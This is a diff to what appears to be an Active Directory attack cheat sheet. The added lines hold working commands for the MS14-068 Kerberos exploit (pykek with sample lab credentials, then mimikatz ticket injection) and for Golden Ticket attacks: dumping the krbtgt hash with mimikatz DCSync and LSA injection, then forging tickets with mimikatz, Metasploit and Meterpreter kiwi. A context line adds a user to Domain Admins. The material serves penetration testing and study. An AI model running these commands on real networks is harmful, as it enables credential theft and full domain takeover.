@@ -6,6 +6,11 @@
     Exploit Python: https://www.exploit-db.com/exploits/35474/
     Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
     Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
+
+    git clone https://github.com/bidord/pykek
+    python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
+    python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
+    mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
     ```
   * MS17-010 (Eternal Blue - Local Admin)
     ```c
@@ -41,8 +46,24 @@
   ```
   * Golden Tickets
   ```c
-  mimikatz
-  kerberos::ptc tgt.bin
+  Get info - Mimikatz
+  lsadump::dcsync /user:krbtgt
+  lsadump::lsa /inject /name:krbtgt
+
+  Get info - Meterpreter(kiwi)
+  dcsync_ntlm krbtgt
+
+  Forge a Golden ticket - Mimikatz
+  kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
+  kerberos::tgt
+
+  Forge a Golden ticket - Metasploit
+  post/windows/escalate/golden_ticket
+
+  Forge a Golden ticket - Meterpreter
+  load kiwi
+  golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
+  kerberos_ticket_use /root/Downloads/pentestlabuser.tck
   ```
   * Kerberoast
     ```c
@@ -120,3 +141,4 @@ net group "Domain Admins" hacker2 /add /domain
  * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
  * [Road to DC](https://steemit.com/infosec/@austinhudson/road-to-dc-part-1)
  * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
+ * [Golden ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)
